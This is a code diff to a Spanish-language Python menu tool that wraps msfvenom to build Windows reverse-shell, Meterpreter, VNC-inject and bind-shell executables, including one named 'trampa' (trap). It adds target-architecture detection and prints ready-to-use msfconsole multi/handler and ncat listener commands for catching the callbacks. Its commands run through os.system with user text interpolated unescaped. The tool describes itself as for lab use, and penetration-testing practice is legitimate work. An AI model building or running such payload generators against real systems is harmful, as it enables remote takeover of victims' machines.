@@ -196,6 +196,96 @@ def mostrar_grid_payloads(payloads, color_n):
             right_text = ""
         print(left_text.ljust(col_w) + " " * gap + right_text)
 
+def detectar_arch_por_objetivo():
+    sel = input("Objetivo: [1] Windows 7 x86  [2] Windows 10 x64  [3] Otro: ").strip()
+    if sel == "1":
+        return False
+    if sel == "2":
+        return True
+    arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits: ").strip()
+    return arch_sel == "2"
+
+def mensaje_handler(code, lhost, lport):
+    if "vncinject/reverse_tcp" in code:
+        return (
+            "\nHandler msfconsole (VNC):\n"
+            "use exploit/multi/handler\n"
+            "set payload windows/vncinject/reverse_tcp\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run -j\n"
+            "\nInstalá un viewer VNC en la máquina atacante para visualizar la sesión.\n"
+            "\nSi la GUI no abre en Win7 x86, probá:\n"
+            "use exploit/multi/handler\n"
+            "set payload windows/meterpreter/reverse_tcp\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "run\n"
+            "\nDentro de meterpreter:\n"
+            "run vnc\n"
+        )
+    if "powershell_reverse_tcp" in code:
+        return (
+            "\nHandler msfconsole (PowerShell):\n"
+            "use exploit/multi/handler\n"
+            "set payload windows/powershell_reverse_tcp\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run\n"
+        )
+    if "shell_reverse_tcp" in code:
+        return (
+            "\nHandler msfconsole (Shell):\n"
+            "use exploit/multi/handler\n"
+            "set payload windows/shell_reverse_tcp\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run\n"
+            "\nAlternativa listener:\n"
+            f"ncat -lvkp {lport}\n"
+        )
+    if "meterpreter_reverse_tcp" in code or "meterpreter/reverse_tcp" in code:
+        return (
+            "\nHandler msfconsole (Meterpreter TCP):\n"
+            "use exploit/multi/handler\n"
+            f"set payload {code}\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run\n"
+        )
+    if "reverse_http" in code or "reverse_https" in code:
+        return (
+            "\nHandler msfconsole (Meterpreter HTTP/HTTPS):\n"
+            "use exploit/multi/handler\n"
+            f"set payload {code}\n"
+            f"set LHOST {lhost}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run\n"
+        )
+    if "bind_tcp" in code:
+        return (
+            "\nHandler msfconsole (Bind TCP):\n"
+            "use exploit/multi/handler\n"
+            f"set payload {code}\n"
+            f"set LPORT {lport}\n"
+            "set ExitOnSession false\n"
+            "run\n"
+        )
+    return (
+        "\nHandler msfconsole (Genérico):\n"
+        "use exploit/multi/handler\n"
+        f"set payload {code}\n"
+        f"set LHOST {lhost}\n"
+        f"set LPORT {lport}\n"
+        "set ExitOnSession false\n"
+        "run\n"
+    )
+
 def generar_payload():
     # Cargar últimos valores de laboratorio, si existen
     _cfg = cargar_config_lab()
@@ -233,7 +323,7 @@ def generar_payload():
                 {"code32": "windows/meterpreter/reverse_http", "code64": "windows/x64/meterpreter/reverse_http", "desc": "Meterpreter inverso HTTP", "ext": "exe", "redirect": False, "needs_lhost": True},
                 {"code32": "windows/meterpreter/reverse_https", "code64": "windows/x64/meterpreter/reverse_https", "desc": "Meterpreter inverso HTTPS", "ext": "exe", "redirect": False, "needs_lhost": True},
                 {"code32": "windows/meterpreter_reverse_tcp", "code64": "windows/x64/meterpreter_reverse_tcp", "desc": "Meterpreter sin etapas TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
-                {"code32": "windows/shell/reverse_tcp", "code64": "windows/x64/shell_reverse_tcp", "desc": "Shell inversa TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
+                {"code32": "windows/shell_reverse_tcp", "code64": "windows/x64/shell_reverse_tcp", "desc": "Shell inversa TCP", "ext": "exe", "redirect": False, "needs_lhost": True},
                 {"code32": "windows/powershell_reverse_tcp", "code64": None, "desc": "PowerShell inversa TCP", "ext": "ps1", "redirect": True, "needs_lhost": True},
                 {"code32": "windows/shell/bind_tcp", "code64": "windows/x64/shell_bind_tcp", "desc": "Shell bind TCP", "ext": "exe", "redirect": False, "needs_lhost": False},
                 {"code32": "windows/meterpreter/bind_tcp", "code64": "windows/x64/meterpreter/bind_tcp", "desc": "Meterpreter bind TCP", "ext": "exe", "redirect": False, "needs_lhost": False},
@@ -261,30 +351,61 @@ def generar_payload():
                 input("\nPresioná Enter para volver al menú...")
                 continue
             seleccionado = payloads[idx - 1]
-            arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits: ").strip()
-            usar64 = arch_sel == "2"
+            usar64_default = detectar_arch_por_objetivo()
+            arch_sel = input("Arquitectura ([Enter] para usar detección): ").strip()
+            usar64 = usar64_default if not arch_sel else arch_sel == "2"
             lhost = pedir_lhost(ultimo_lhost)
             lport = pedir_lport(ultimo_lport)
             nombre_raw = input("Nombre del archivo de salida: ").strip()
             prefijo = "payload_win" if seleccionado["ext"] != "ps1" else "payload_ps1"
             archivo = sanitizar_nombre_archivo(nombre_raw, prefijo, seleccionado["ext"])
             code = seleccionado["code64"] if usar64 and seleccionado["code64"] else seleccionado["code32"]
+            arch_flag = "-a x64" if usar64 else "-a x86"
+            plat_flag = "--platform windows"
             if seleccionado["redirect"]:
                 if seleccionado["needs_lhost"]:
-                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} -f {seleccionado['ext']} > {archivo}"
+                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} > {archivo}"
                 else:
-                    comando = f"msfvenom -p {code} LPORT={lport} -f {seleccionado['ext']} > {archivo}"
+                    comando = f"msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} > {archivo}"
             else:
+                oflag = f"-o {archivo}" if seleccionado['ext'] != 'ps1' else f"> {archivo}"
                 if seleccionado["needs_lhost"]:
-                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} -f {seleccionado['ext']} -o {archivo}"
+                    comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} {oflag}"
                 else:
-                    comando = f"msfvenom -p {code} LPORT={lport} -f {seleccionado['ext']} -o {archivo}"
+                    comando = f"msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f {seleccionado['ext']} {oflag}"
+            mensaje_post = None
+            if "vncinject/reverse_tcp" in code:
+                mensaje_post = (
+                    "\nHandler msfconsole (VNC):\n"
+                    "use exploit/multi/handler\n"
+                    "set payload windows/vncinject/reverse_tcp\n"
+                    f"set LHOST {lhost}\n"
+                    f"set LPORT {lport}\n"
+                    "set ExitOnSession false\n"
+                    "run -j\n"
+                    "\nNecesitás un viewer VNC instalado (ej: tigervnc-viewer/realvnc) para que se abra la ventana.\n"
+                )
+            elif "shell_reverse_tcp" in code:
+                mensaje_post = (
+                    "\nHandler msfconsole (Shell):\n"
+                    "use exploit/multi/handler\n"
+                    "set payload windows/shell_reverse_tcp\n"
+                    f"set LHOST {lhost}\n"
+                    f"set LPORT {lport}\n"
+                    "set ExitOnSession false\n"
+                    "run\n"
+                    "\nAlternativa listener simple:\n"
+                    f"ncat -lvkp {lport}\n"
+                )
             if verificar_msfvenom():
                 print(f"\nEjecutando:\n{comando}\n")
                 log(comando)
                 os.system(comando)
                 guardar_config_lab(lhost, lport)
                 imprimir_resumen_archivo(archivo)
+                mh = mensaje_handler(code, lhost, lport)
+                if mh:
+                    print(mh)
             input("\nPayload generado (si no hubo errores). Presioná Enter para volver al menú...")
 
         elif opcion == "3":
@@ -304,14 +425,18 @@ def generar_payload():
                     nombre_raw, "trampa", "exe")
             else:
                 filename = sanitizar_nombre_archivo("", "trampa", "exe")
-
-            comando = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {filename}"
+            usar64_default = detectar_arch_por_objetivo()
+            arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits (Enter=auto): ").strip()
+            usar64 = usar64_default if not arch_sel else arch_sel == "2"
+            code = "windows/x64/shell_reverse_tcp" if usar64 else "windows/shell_reverse_tcp"
+            comando = f"msfvenom -p {code} LHOST={lhost} LPORT={lport} --platform windows {'-a x64' if usar64 else '-a x86'} -f exe -o {filename}"
             if verificar_msfvenom():
                 print(f"\nEjecutando:\n{comando}\n")
                 log(comando)
                 os.system(comando)
                 guardar_config_lab(lhost, lport)
                 imprimir_resumen_archivo(filename)
+                print(mensaje_handler(code, lhost, lport))
             input("\nPayload generado. Presioná Enter para volver al menú...")
 
         elif opcion == "9":
@@ -342,27 +467,39 @@ def generar_payload():
                 output_raw = input("Nombre del archivo .exe: ")
                 archivo = sanitizar_nombre_archivo(
                     output_raw, "payload_win", "exe")
+                usar64_default = detectar_arch_por_objetivo()
+                arch_sel = input("Arquitectura: [1] 32 bits  [2] 64 bits (Enter=auto): ").strip()
+                usar64 = usar64_default if not arch_sel else arch_sel == "2"
+                arch_flag = "-a x64" if usar64 else "-a x86"
+                plat_flag = "--platform windows"
 
                 if subopcion == "4.1":
-                    comando = f"{autor} && msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {archivo}"
+                    code = "windows/x64/meterpreter/reverse_tcp" if usar64 else "windows/meterpreter/reverse_tcp"
+                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                     archivo_generado = archivo
                 elif subopcion == "4.2":
-                    comando = f"{autor} && msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {archivo}"
+                    code = "windows/x64/shell_reverse_tcp" if usar64 else "windows/shell_reverse_tcp"
+                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                     archivo_generado = archivo
                 elif subopcion == "4.3":
-                    comando = f"{autor} && msfvenom -p windows/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -f exe -o {archivo}"
+                    code = "windows/x64/meterpreter/reverse_https" if usar64 else "windows/meterpreter/reverse_https"
+                    comando = f"{autor} && msfvenom -p {code} LHOST={lhost} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                     archivo_generado = archivo
                 elif subopcion == "4.4":
-                    comando = f"{autor} && msfvenom -p windows/shell/bind_tcp LPORT={lport} -f exe -o {archivo}"
+                    code = "windows/x64/shell_bind_tcp" if usar64 else "windows/shell/bind_tcp"
+                    comando = f"{autor} && msfvenom -p {code} LPORT={lport} {plat_flag} {arch_flag} -f exe -o {archivo}"
                     archivo_generado = archivo
                 elif subopcion == "4.5":
                     mensaje = input("Mensaje personalizado: ")
-                    comando = f"{autor} && msfvenom -p windows/messagebox TEXT=\"{mensaje}\" -f exe -o {archivo}"
+                    code = "windows/messagebox"
+                    comando = f"{autor} && msfvenom -p {code} TEXT=\"{mensaje}\" {plat_flag} {arch_flag} -f exe -o {archivo}"
                     archivo_generado = archivo
                 else:
                     print("Subopción inválida.")
                     input("\nPresioná Enter para volver al menú...")
                     continue
+
+                print(mensaje_handler(code, lhost, lport))
 
             elif opcion == "5":
                 print("5.1 Shell Reverse TCP (ELF)")
